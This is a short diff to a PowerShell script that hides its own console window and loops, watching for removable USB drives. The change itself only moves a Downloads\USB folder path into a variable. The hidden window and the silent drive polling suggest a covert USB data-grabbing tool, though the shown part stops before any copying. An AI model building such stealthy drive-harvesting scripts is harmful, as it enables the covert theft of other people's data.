@@ -6,8 +6,10 @@ $Signature = @"
 $ShowWindowAsync = Add-Type -MemberDefinition $Signature -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru
 $ShowWindowAsync::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0)
 
-mkdir "$Env:USERPROFILE\Downloads\USB"
-Set-Location "$Env:USERPROFILE\Downloads\USB"
+$path = "$Env:USERPROFILE\Downloads\USB"
+
+mkdir "$path"
+Set-Location "$path"
 while ($true){
     if ((get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter -ne $null) {
         $Driveletters = (get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter
